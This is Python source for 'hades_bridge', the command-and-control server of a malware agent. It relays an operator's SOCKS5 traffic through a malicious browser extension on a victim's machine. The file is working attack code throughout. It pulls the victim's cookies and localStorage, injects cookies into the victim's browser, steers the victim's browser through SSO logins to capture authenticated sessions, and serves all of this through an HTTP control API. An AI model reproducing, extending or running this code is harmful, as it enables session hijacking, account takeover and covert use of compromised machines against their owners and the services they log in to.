"""
hades_bridge — SOCKS5 relay server for Hades agent

Runs on the C2 server. Two listeners:
  - SOCKS5 : 127.0.0.1:1080  (operator SSH-tunnels to this)
  - WSS     : 127.0.0.1:8444  (nginx proxies wss://domain/proxy-ws here)

The extension on the victim machine connects via WSS. Each SOCKS5
connection from the operator is multiplexed over the WSS channel to
the extension, which forwards it to the native host (host.py) on the
victim machine, which opens the real TCP connection.

Run:
    screen -S socks
    python3 socks_bridge.py
    Ctrl-A D

Operator setup:
    ssh -L 1080:127.0.0.1:1080 user@c2server
    Configure browser SOCKS5 proxy: 127.0.0.1:1080
"""

import asyncio
import json
import struct
import uuid
import time
import base64
import logging
import socket as _socket
import ssl
import os
import re
import sys
import datetime
from urllib.parse import urlparse, parse_qs
import websockets
import websockets.exceptions
# ── Logging ───────────────────────────────────────────────────────────────────
# Logs to stdout (captured by screen/systemd) and to socks_bridge.log beside
# this script. Rotate manually or with logrotate if needed.

_log_file = __file__.replace('.py', '.log')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(_log_file, encoding='utf-8'),
    ],
)
log = logging.getLogger('hades_bridge')

SOCKS_HOST = '127.0.0.1'
SOCKS_PORT = 1080

WSS_HOST = '127.0.0.1'
WSS_PORT = 8444

# ── Routing ───────────────────────────────────────────────────────────────────
# DIRECT_BYPASS: domains that go direct from the proxy server.
#
# Rule: if routing through the victim causes rate-limiting or the domain
# doesn't need the victim's IP for access, bypass it.
#
# Domains that require the victim's IP (authenticated, IP-restricted services):

DIRECT_BYPASS = (
    # Google (Chrome background noise — never needs victim IP)
    ".google.com",
    ".googleapis.com",
    ".gstatic.com",
    ".googleusercontent.com",
    ".googletagmanager.com",
    ".google-analytics.com",
    ".googleadservices.com",
    # Add target-specific CDN/analytics domains here to reduce load on victim extension
    # e.g. static CDN domains that serve public assets without authentication
)

def _needs_victim(host: str) -> bool:
    h = host.lower()
    return not any(h == d.lstrip('.') or h.endswith(d) for d in DIRECT_BYPASS)


# ── Shared state ──────────────────────────────────────────────────────────────

# Active extension connection
_browser_ws   = None
_browser_id   = None
browser_info  = {}  # br_id → {connected_at: float}

# Per-SOCKS-connection state
# conn_id → asyncio.Future  (resolved when native TCP connect succeeds/fails)
_pending = {}
# conn_id → asyncio.Queue   (inbound data chunks from the target, via extension)
_queues  = {}

# Pending localStorage requests  req_id → asyncio.Future
_ls_pending = {}

# Cookie cache  host → (cookie_list, timestamp)
_cookie_cache: dict = {}

# localStorage cache  host → (data_dict, timestamp)
_ls_cache: dict = {}

# Pending HTTP probe requests  req_id → asyncio.Future
_http_probe_pending = {}


# Pending cookie requests  req_id → asyncio.Future
_cookies_pending: dict = {}

# Pending navigate/session-capture requests  req_id → asyncio.Future
_navigate_pending: dict = {}

# Pending session_export requests  req_id → asyncio.Future
_session_export_pending: dict = {}

# ── Connection statistics ─────────────────────────────────────────────────────
_stats = {
    'socks_attempts':    0,
    'socks_ok':          0,
    'socks_no_ext':      0,
    'socks_timeout':     0,
    'socks_error':       0,
    'ext_connects':      0,
    'ext_disconnects':   0,
    'native_errors':     0,   # socks_error messages from native host
    'pong_received':     0,
    'bytes_client_to_target': 0,
    'bytes_target_to_client': 0,
}
_last_pong_at: float = 0.0


# ── Send to extension ─────────────────────────────────────────────────────────

async def _send(obj):
    if _browser_ws:
        try:
            await _browser_ws.send(json.dumps(obj, separators=(',', ':')))
            return True
        except Exception:
            pass
    return False



# ── Route messages arriving from the extension ────────────────────────────────

async def _route_from_extension(data):
    t       = data.get('type')
    conn_id = data.get('id')

    if t == 'socks_connected':
        fut = _pending.get(conn_id)
        if fut and not fut.done():
            fut.set_result(True)
        # Wake the SW immediately so it's ready to forward the response data
        # without waiting for the next 10 s native-host keepalive ping.
        asyncio.ensure_future(_send({'type': 'ping', 'ts': int(time.time() * 1000)}))

    elif t == 'socks_error':
        err_msg = data.get('error', 'connect failed')
        _stats['native_errors'] += 1
        log.warning(f'{str(conn_id)[:8]} native host error: {err_msg}')
        fut = _pending.get(conn_id)
        if fut and not fut.done():
            fut.set_exception(ConnectionError(err_msg))
        q = _queues.get(conn_id)
        if q:
            await q.put(None)

    elif t == 'socks_data':
        q = _queues.get(conn_id)
        if q:
            raw = base64.b64decode(data.get('data', ''))
            await q.put(raw)

    elif t == 'socks_closed':
        q = _queues.get(conn_id)
        if q:
            await q.put(None)  # EOF sentinel

    elif t in ('localstorage_response', 'localstorage_set_response'):
        fut = _ls_pending.pop(conn_id, None)
        if fut and not fut.done():
            fut.set_result(data)

    elif t in ('cookies_response', 'cookies_set_response'):
        fut = _cookies_pending.pop(conn_id, None)
        if fut and not fut.done():
            fut.set_result(data)

    elif t == 'navigate_response':
        fut = _navigate_pending.pop(conn_id, None)
        if fut and not fut.done():
            fut.set_result(data)
        # Update caches from the session data included in the response
        cookies = data.get('cookies', [])
        ls_raw  = data.get('localStorage')
        try:
            origin = data.get('origin', '')
            if not origin and data.get('tabId'):
                pass  # origin not included when no tab found
        except Exception:
            pass

    elif t == 'session_export_response':
        fut = _session_export_pending.pop(conn_id, None)
        if fut and not fut.done():
            fut.set_result(data)

    elif t == 'http_probe_response':
        fut = _http_probe_pending.pop(conn_id, None)
        if fut and not fut.done():
            fut.set_result(data)


    elif t == 'cookies_push':
        origin  = data.get('origin', '')
        host    = origin.replace('https://', '').replace('http://', '').split('/')[0]
        cookies = data.get('cookies', [])
        if cookies and host:
            _cookie_cache[host] = (cookies, time.time())
            log.info(f'[cookies] auto-push from victim: {host} ({len(cookies)} cookies)')

    elif t == 'localstorage_push':
        # Victim navigated to a target origin — cache their localStorage now
        origin = data.get('origin', '')
        host   = origin.replace('https://', '').replace('http://', '').split('/')[0]
        raw    = data.get('data', '{}')
        try:
            ls_data = json.loads(raw)
            if ls_data:
                _ls_cache[host] = (ls_data, time.time())
                log.info(f'[localStorage] auto-push from victim: {host} ({len(ls_data)} keys)')
        except Exception:
            pass


def _drain_all_connections(error='extension disconnected'):
    """Called when the extension disconnects — abort all pending connections."""
    for conn_id, fut in list(_pending.items()):
        if not fut.done():
            fut.set_exception(ConnectionError(error))
    for conn_id, q in list(_queues.items()):
        try:
            q.put_nowait(None)
        except Exception:
            pass


# ── WSS server (extension connects here) ─────────────────────────────────────

async def _wss_handler(ws):
    global _browser_ws, _browser_id, _last_pong_at

    br_id = str(uuid.uuid4())
    _browser_ws = ws
    _browser_id = br_id
    browser_info[br_id] = {'connected_at': time.time()}
    _stats['ext_connects'] += 1
    log.info(f'Extension connected: {br_id[:8]}  '
             f'(total connects: {_stats["ext_connects"]})')

    try:
        async for message in ws:
            try:
                data = json.loads(message)
                t = data.get('type')
                if t == 'register':
                    log.info(f"Registered: {br_id[:8]}  "
                             f"v={data.get('extensionVersion','?')}  "
                             f"ua={data.get('userAgent','?')[:60]}")
                elif t == 'pong':
                    _stats['pong_received'] += 1
                    _last_pong_at = time.time()
                else:
                    await _route_from_extension(data)
            except json.JSONDecodeError as e:
                log.warning(f'{br_id[:8]} bad JSON from extension: {e}')
            except Exception as e:
                log.warning(f'{br_id[:8]} route error: {e}')
    except websockets.exceptions.ConnectionClosed as e:
        # Works with all websockets versions; subclasses (OK/Error) vary by version
        log.info(f'{br_id[:8]} WSS closed (code={getattr(e, "code", "?")})')
    except Exception as e:
        log.error(f'WSS handler exception: {type(e).__name__}: {e}')
    finally:
        if _browser_id == br_id:
            _browser_ws = None
            _browser_id = None
        _stats['ext_disconnects'] += 1
        uptime    = int(time.time() - browser_info.pop(br_id, {}).get('connected_at', time.time()))
        pong_age  = int(time.time() - _last_pong_at) if _last_pong_at else -1
        log.info(f'Extension disconnected: {br_id[:8]}  uptime={uptime}s  '
                 f'last_pong={pong_age}s ago  '
                 f'native_errors={_stats["native_errors"]}  '
                 f'active_conns={len(_queues)}')
        _drain_all_connections()


# ── SOCKS5 server ─────────────────────────────────────────────────────────────

async def _read_exactly(reader, n):
    buf = b''
    while len(buf) < n:
        chunk = await reader.read(n - len(buf))
        if not chunk:
            raise EOFError('connection closed')
        buf += chunk
    return buf


async def _direct_relay(reader, writer, host, port, conn_id):
    """Connect directly from the proxy server (Google bypass — source IP is
    the proxy server's). Still faster than routing through the extension for
    high-volume public domains that don't need the victim's IP."""
    try:
        t_reader, t_writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=15
        )
    except Exception as e:
        log.warning(f'{conn_id[:8]} direct connect failed {host}:{port} — {e}')
        writer.write(b'\x05\x04\x00\x01' + b'\x00' * 6)
        writer.close()
        return

    log.info(f'{conn_id[:8]} open [direct] → {host}:{port}')
    writer.write(b'\x05\x00\x00\x01' + b'\x00' * 6)
    await writer.drain()

    async def pipe(src_r, dst_w):
        try:
            while True:
                data = await src_r.read(131072)
                if not data:
                    break
                dst_w.write(data)
                await dst_w.drain()
        except Exception:
            pass
        finally:
            try:
                dst_w.close()
                await dst_w.wait_closed()
            except Exception:
                pass

    await asyncio.gather(pipe(reader, t_writer), pipe(t_reader, writer),
                         return_exceptions=True)
    log.info(f'{conn_id[:8]} closed [direct]')


async def _socks5_handler(reader, writer):
    conn_id = str(uuid.uuid4())
    peer    = writer.get_extra_info('peername', ('?', 0))

    try:
        # ── Greeting ─────────────────────────────────────────────────────────
        header = await _read_exactly(reader, 2)
        ver, nmethods = header
        if ver != 5:
            writer.close()
            return
        await _read_exactly(reader, nmethods)   # discard method list

        # No-auth reply
        writer.write(b'\x05\x00')
        await writer.drain()

        # ── CONNECT request ───────────────────────────────────────────────────
        req = await _read_exactly(reader, 4)
        ver, cmd, _, atyp = req

        if atyp == 1:       # IPv4
            host = _socket.inet_ntoa(await _read_exactly(reader, 4))
        elif atyp == 3:     # Domain
            n    = (await _read_exactly(reader, 1))[0]
            host = (await _read_exactly(reader, n)).decode()
        elif atyp == 4:     # IPv6
            host = _socket.inet_ntop(_socket.AF_INET6,
                                     await _read_exactly(reader, 16))
        else:
            writer.write(b'\x05\x08\x00\x01' + b'\x00' * 6)
            writer.close()
            return

        port = struct.unpack('>H', await _read_exactly(reader, 2))[0]

        if cmd != 1:    # Only CONNECT supported
            writer.write(b'\x05\x07\x00\x01' + b'\x00' * 6)
            writer.close()
            return

        # Route via victim's browser if the domain requires victim IP, otherwise direct.
        via = 'direct' if not _needs_victim(host) else 'victim'
        log.info(f'{conn_id[:8]} CONNECT {host}:{port} [{via}]')

        # ── Google bypass — direct from proxy server ──────────────────────────
        if via == 'direct':
            await _direct_relay(reader, writer, host, port, conn_id)
            return

        # ── Everything else → extension → host.py on victim ──────────────────
        # Extension must be connected ─────────────────────────────────────────
        _stats['socks_attempts'] += 1
        if not _browser_ws:
            _stats['socks_no_ext'] += 1
            log.warning(f'{conn_id[:8]} CONNECT {host}:{port} — no extension connected')
            writer.write(b'\x05\x04\x00\x01' + b'\x00' * 6)
            writer.close()
            return

        # ── Ask extension to open TCP connection on victim ────────────────────
        loop = asyncio.get_event_loop()
        fut  = loop.create_future()
        _pending[conn_id] = fut
        _queues[conn_id]  = asyncio.Queue()

        ok = await _send({
            'type': 'socks_connect',
            'id':   conn_id,
            'host': host,
            'port': port,
        })
        if not ok:
            writer.write(b'\x05\x04\x00\x01' + b'\x00' * 6)
            writer.close()
            return

        # Wait up to 15 s for the native host to complete the TCP connect
        t_connect = time.monotonic()
        try:
            await asyncio.wait_for(fut, timeout=15)
        except asyncio.TimeoutError:
            _stats['socks_timeout'] += 1
            elapsed = time.monotonic() - t_connect
            log.warning(f'{conn_id[:8]} CONNECT {host}:{port} timed out after {elapsed:.1f}s '
                        f'— native host may not be running or PSK mismatch')
            writer.write(b'\x05\x04\x00\x01' + b'\x00' * 6)
            return
        except ConnectionError as e:
            _stats['socks_error'] += 1
            log.warning(f'{conn_id[:8]} CONNECT {host}:{port} refused by native host: {e}')
            writer.write(b'\x05\x05\x00\x01' + b'\x00' * 6)
            return
        finally:
            _pending.pop(conn_id, None)

        # ── Tell SOCKS client the connection is open ──────────────────────────
        _stats['socks_ok'] += 1
        elapsed = time.monotonic() - t_connect
        writer.write(b'\x05\x00\x00\x01' + b'\x00' * 6)
        await writer.drain()
        log.info(f'{conn_id[:8]} open → {host}:{port}  ({elapsed*1000:.0f}ms)')

        # ── Bidirectional relay ───────────────────────────────────────────────

        async def client_to_target():
            """Operator → extension → victim TCP."""
            try:
                while True:
                    data = await reader.read(65536)
                    if not data:
                        break
                    _stats['bytes_client_to_target'] += len(data)
                    ok = await _send({
                        'type': 'socks_data',
                        'id':   conn_id,
                        'data': base64.b64encode(data).decode('ascii'),
                    })
            except Exception as e:
                log.debug(f'{conn_id[:8]} client_to_target: {e}')
            finally:
                await _send({'type': 'socks_close', 'id': conn_id})

        async def target_to_client():
            """Victim TCP → extension → operator."""
            q = _queues[conn_id]
            try:
                while True:
                    chunk = await q.get()
                    if chunk is None:   # EOF
                        break
                    _stats['bytes_target_to_client'] += len(chunk)
                    writer.write(chunk)
                    await writer.drain()
            except Exception as e:
                log.debug(f'{conn_id[:8]} target_to_client: {e}')

        await asyncio.gather(
            client_to_target(),
            target_to_client(),
            return_exceptions=True,
        )

    except EOFError:
        pass
    except Exception as e:
        log.warning(f'{conn_id[:8]} error: {e}')
    finally:
        _pending.pop(conn_id, None)
        _queues.pop(conn_id, None)
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
        log.info(f'{conn_id[:8]} closed')


# ── Keepalive pings ───────────────────────────────────────────────────────────

async def _keepalive():
    missed = 0
    while True:
        await asyncio.sleep(20)
        if _browser_ws:
            prev_pong = _last_pong_at
            try:
                await _browser_ws.send(json.dumps(
                    {'type': 'ping', 'ts': int(time.time() * 1000)}
                ))
            except Exception as e:
                log.warning(f'[keepalive] ping failed: {e}')
                continue
            # Check if we received a pong to the previous ping
            if prev_pong == _last_pong_at and prev_pong > 0:
                missed += 1
                log.warning(f'[keepalive] no pong received (missed={missed}  '
                            f'last_pong={int(time.time()-_last_pong_at)}s ago)')
            else:
                missed = 0
        else:
            if missed == 0:
                pass  # Silent when no extension — normal state
            missed = 0


# ── HTTP control plane ────────────────────────────────────────────────────────
# Operator can SSH-tunnel port 8890 and use curl to read/write victim's
# localStorage. No extra dependencies — pure asyncio HTTP.
#
# GET  /localstorage?origin=https://<target.example.com>  → dump as JSON
# POST /localstorage?origin=https://<target.example.com>  → inject (body = JSON blob)
# GET  /status                                     → bridge status

CTRL_HOST = '127.0.0.1'
CTRL_PORT = 8890


async def _ctrl_localstorage_get(origin: str) -> dict:
    if not _browser_ws:
        return {'error': 'no extension connected'}
    req_id = str(uuid.uuid4())
    loop   = asyncio.get_event_loop()
    fut    = loop.create_future()
    _ls_pending[req_id] = fut
    await _send({'type': 'get_localstorage', 'id': req_id, 'origin': origin})
    try:
        resp = await asyncio.wait_for(fut, timeout=10)
        if 'error' in resp:
            return {'error': resp['error']}
        return {'origin': origin, 'localstorage': json.loads(resp['data'])}
    except asyncio.TimeoutError:
        _ls_pending.pop(req_id, None)
        return {'error': 'timeout — is a tab open at that origin in victim browser?'}


async def _ctrl_localstorage_set(origin: str, data: str) -> dict:
    if not _browser_ws:
        return {'error': 'no extension connected'}
    req_id = str(uuid.uuid4())
    loop   = asyncio.get_event_loop()
    fut    = loop.create_future()
    _ls_pending[req_id] = fut
    await _send({'type': 'set_localstorage', 'id': req_id, 'origin': origin,
                 'data': data})
    try:
        resp = await asyncio.wait_for(fut, timeout=10)
        return resp
    except asyncio.TimeoutError:
        _ls_pending.pop(req_id, None)
        return {'error': 'timeout'}


def _parse_origin(origin: str) -> str:
    """'https://target.example.com/' → 'target.example.com'"""
    return origin.replace('https://', '').replace('http://', '').rstrip('/').split('/')[0]


async def _ctrl_cookies_get(origin: str) -> dict:
    if not _browser_ws:
        host = _parse_origin(origin)
        cached = _cookie_cache.get(host)
        if cached:
            return {'origin': origin, 'cookies': cached[0], 'source': 'cache',
                    'age_s': int(time.time() - cached[1])}
        return {'error': 'no extension connected and no cached cookies'}
    req_id = str(uuid.uuid4())
    fut    = asyncio.get_event_loop().create_future()
    _cookies_pending[req_id] = fut
    await _send({'type': 'get_cookies', 'id': req_id, 'origin': origin})
    try:
        resp = await asyncio.wait_for(fut, timeout=10)
        cookies = resp.get('cookies', [])
        host = _parse_origin(origin)
        if cookies:
            _cookie_cache[host] = (cookies, time.time())
        return {'origin': origin, 'cookies': cookies, 'source': 'live'}
    except asyncio.TimeoutError:
        _cookies_pending.pop(req_id, None)
        return {'error': 'timeout'}


async def _ctrl_cookies_set(origin: str, cookies: list) -> dict:
    if not _browser_ws:
        return {'error': 'no extension connected'}
    req_id = str(uuid.uuid4())
    fut    = asyncio.get_event_loop().create_future()
    _cookies_pending[req_id] = fut
    await _send({'type': 'set_cookies', 'id': req_id, 'origin': origin, 'cookies': cookies})
    try:
        resp = await asyncio.wait_for(fut, timeout=15)
        return resp
    except asyncio.TimeoutError:
        _cookies_pending.pop(req_id, None)
        return {'error': 'timeout'}


async def _ctrl_session_export(origin: str) -> dict:
    """Live session export (cookies + localStorage). Falls back to cache."""
    if _browser_ws:
        req_id = str(uuid.uuid4())
        fut    = asyncio.get_event_loop().create_future()
        _session_export_pending[req_id] = fut
        await _send({'type': 'session_export', 'id': req_id, 'origin': origin})
        try:
            resp = await asyncio.wait_for(fut, timeout=15)
            cookies = resp.get('cookies', [])
            ls_raw  = resp.get('localStorage')
            if isinstance(ls_raw, str):
                try:   ls_raw = json.loads(ls_raw)
                except Exception: ls_raw = None
            host = _parse_origin(origin)
            if cookies:  _cookie_cache[host] = (cookies, time.time())
            if ls_raw:   _ls_cache[host]     = (ls_raw,  time.time())
            return {'origin': origin, 'cookies': cookies,
                    'localStorage': ls_raw or {}, 'source': 'live'}
        except asyncio.TimeoutError:
            _session_export_pending.pop(req_id, None)

    # Cache fallback
    host        = _parse_origin(origin)
    c_cached    = _cookie_cache.get(host)
    ls_cached   = _ls_cache.get(host)
    return {
        'origin':       origin,
        'cookies':      c_cached[0]  if c_cached  else [],
        'localStorage': ls_cached[0] if ls_cached else {},
        'source':       'cache',
        'note':         'no live extension response — serving from cache',
    }


async def _ctrl_session_capture(url: str) -> dict:
    """Navigate victim to url, wait for SSO authentication to complete, return session.
    Chrome on the victim handles the auth flow natively via its cookie jar."""
    if not _browser_ws:
        return {'error': 'no extension connected'}
    try:
        origin = url if url.startswith('http') else f'https://{url}'
        o = urlparse(origin)
        origin = f'{o.scheme}://{o.netloc}'
    except Exception:
        return {'error': f'invalid url: {url}'}

    log.info(f'[session-capture] navigating victim → {url}')
    req_id = str(uuid.uuid4())
    fut    = asyncio.get_event_loop().create_future()
    _navigate_pending[req_id] = fut
    await _send({'type': 'navigate', 'id': req_id, 'url': url, 'wait_for_load': True})
    try:
        resp = await asyncio.wait_for(fut, timeout=95)
    except asyncio.TimeoutError:
        _navigate_pending.pop(req_id, None)
        return {'error': 'timed out waiting for victim tab to load (90s)'}

    if 'error' in resp:
        return resp

    cookies = resp.get('cookies', [])
    ls_raw  = resp.get('localStorage')
    if isinstance(ls_raw, str):
        try:   ls_raw = json.loads(ls_raw)
        except Exception: ls_raw = None

    host = _parse_origin(origin)
    if cookies:  _cookie_cache[host] = (cookies, time.time())
    if ls_raw:   _ls_cache[host]     = (ls_raw,  time.time())

    log.info(f'[session-capture] complete: {origin} — '
             f'{len(cookies)} cookies, {len(ls_raw) if ls_raw else 0} ls keys')
    return {
        'origin':       origin,
        'cookies':      cookies,
        'localStorage': ls_raw or {},
        'timed_out':    resp.get('timedOut', False),
        'note':         'inject cookies into operator browser via companion extension',
    }


async def _ctrl_navigate_simple(url: str, wait_for_load: bool) -> dict:
    if not _browser_ws:
        return {'error': 'no extension connected'}
    req_id = str(uuid.uuid4())
    fut    = asyncio.get_event_loop().create_future()
    _navigate_pending[req_id] = fut
    await _send({'type': 'navigate', 'id': req_id, 'url': url,
                 'wait_for_load': wait_for_load})
    tmo = 95 if wait_for_load else 10
    try:
        return await asyncio.wait_for(fut, timeout=tmo)
    except asyncio.TimeoutError:
        _navigate_pending.pop(req_id, None)
        return {'error': f'timeout after {tmo}s'}


async def _ctrl_session_inject(origin: str, session_data: dict) -> dict:
    """Push a captured session into the victim's browser (or to restore)."""
    results = {}
    cookies = session_data.get('cookies', [])
    if cookies:
        results['cookies'] = await _ctrl_cookies_set(origin, cookies)
    ls = session_data.get('localStorage')
    if ls:
        ls_str = json.dumps(ls) if isinstance(ls, dict) else ls
        results['localStorage'] = await _ctrl_localstorage_set(origin, ls_str)
    return results


async def _ctrl_handler(reader, writer):
    try:
        # Read request line + headers
        request_line = (await reader.readline()).decode(errors='replace').strip()
        headers = {}
        while True:
            line = (await reader.readline()).decode(errors='replace').strip()
            if not line:
                break
            if ':' in line:
                k, _, v = line.partition(':')
                headers[k.strip().lower()] = v.strip()

        parts   = request_line.split()
        method  = parts[0] if parts else 'GET'
        path    = parts[1] if len(parts) > 1 else '/'
        parsed  = urlparse(path)
        qs      = parse_qs(parsed.query)
        origin  = qs.get('origin', [''])[0]

        body = b''
        if method == 'POST':
            length = int(headers.get('content-length', 0))
            if length:
                body = await reader.read(length)

        # Route
        if parsed.path == '/session/capture':
            # Navigate victim to URL, let SSO auth run natively, export session.
            # Single call that handles the entire auth flow.
            url = qs.get('url', [origin])[0] or origin
            result = await _ctrl_session_capture(url)

        elif parsed.path == '/session':
            if method == 'GET':
                result = await _ctrl_session_export(origin)
            elif method == 'POST':
                try:
                    session_data = json.loads(body.decode())
                    result       = await _ctrl_session_inject(origin, session_data)
                except Exception as e:
                    result = {'error': f'invalid body: {e}'}
            else:
                result = {'error': 'use GET or POST'}

        elif parsed.path == '/navigate':
            url      = qs.get('url', [origin])[0] or origin
            wait_str = qs.get('wait', ['false'])[0].lower()
            result   = await _ctrl_navigate_simple(url, wait_str not in ('false', '0', 'no'))

        elif parsed.path == '/cookies':
            if method == 'GET':
                result = await _ctrl_cookies_get(origin)
            elif method == 'POST':
                try:
                    cookies = json.loads(body.decode())
                    if isinstance(cookies, list):
                        result = await _ctrl_cookies_set(origin, cookies)
                    else:
                        # Legacy: operator stores cookies manually in cache
                        host = _parse_origin(origin)
                        _cookie_cache[host] = (cookies, time.time())
                        result = {'ok': True, 'stored': len(cookies)}
                except Exception as e:
                    result = {'error': str(e)}
            else:
                result = {'error': 'use GET or POST'}

        elif parsed.path == '/localstorage':
            if method == 'GET':
                result = await _ctrl_localstorage_get(origin)
            elif method == 'POST':
                result = await _ctrl_localstorage_set(origin, body.decode())
            else:
                result = {'error': 'use GET or POST'}

        elif parsed.path == '/status':
            uptime = int(time.time() - browser_info[_browser_id]['connected_at']) \
                     if _browser_id and _browser_id in browser_info else None
            result = {
                'extension_connected': _browser_id is not None,
                'extension_id':        _browser_id[:8] if _browser_id else None,
                'extension_uptime_s':  uptime,
                'last_pong_s_ago':     int(time.time() - _last_pong_at) if _last_pong_at else None,
                'active_connections':  len(_queues),
                'pending_connects':    len(_pending),
                'stats':               _stats,
                'ls_cached':           list(_ls_cache.keys()),
                'cookies_cached':      list(_cookie_cache.keys()),
            }
        else:
            result = {'error': 'unknown endpoint', 'endpoints': [
                'GET  /session/capture?url=https://... — navigate victim, wait for SSO auth, return session',
                'GET  /session?origin=https://...      — export cookies+localStorage (live or cache)',
                'POST /session?origin=https://...      — inject session (body = JSON from GET)',
                'GET  /navigate?url=https://...        — navigate victim tab (add &wait=true to block)',
                'GET  /cookies?origin=https://...      — live cookie read from victim browser',
                'POST /cookies?origin=https://...      — set cookies in victim browser (body=JSON array)',
                'GET  /localstorage?origin=https://... — dump localStorage',
                'POST /localstorage?origin=https://... — inject localStorage (body=JSON)',
                'GET  /status                          — bridge status',
            ]}

        body_out = json.dumps(result, indent=2).encode()
        writer.write(
            b'HTTP/1.1 200 OK\r\n'
            b'Content-Type: application/json\r\n'
            b'Access-Control-Allow-Origin: *\r\n'
            + b'Content-Length: ' + str(len(body_out)).encode() + b'\r\n\r\n'
            + body_out
        )
        await writer.drain()
    except Exception as e:
        log.warning(f'ctrl error: {e}')
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass


# ── Entry point ───────────────────────────────────────────────────────────────

async def main():
    log.info('=' * 50)
    log.info('hades_bridge — SOCKS5 relay server for Hades agent')
    log.info(f'SOCKS5 : {SOCKS_HOST}:{SOCKS_PORT}  (SSH tunnel to reach)')
    log.info(f'WSS    : {WSS_HOST}:{WSS_PORT}  (nginx /proxy-ws)')
    log.info(f'Ctrl   : {CTRL_HOST}:{CTRL_PORT}  (SSH tunnel for localStorage API)')
    log.info(f'Log    : {_log_file}')
    log.info('=' * 50)

    wss_server   = await websockets.serve(
        _wss_handler, WSS_HOST, WSS_PORT,
        ping_interval=20, ping_timeout=15,
        compression=None,
    )
    socks_server = await asyncio.start_server(
        _socks5_handler, SOCKS_HOST, SOCKS_PORT,
    )
    ctrl_server  = await asyncio.start_server(
        _ctrl_handler, CTRL_HOST, CTRL_PORT,
    )

    log.info(f'WSS bridge listening on {WSS_HOST}:{WSS_PORT}')
    log.info(f'SOCKS5  listening on   {SOCKS_HOST}:{SOCKS_PORT}')
    log.info(f'Ctrl    listening on   {CTRL_HOST}:{CTRL_PORT}')

    asyncio.create_task(_keepalive())

    async with socks_server, ctrl_server:
        await asyncio.gather(
            wss_server.wait_closed(),
            socks_server.serve_forever(),
            ctrl_server.serve_forever(),
        )


if __name__ == '__main__':
    asyncio.run(main())
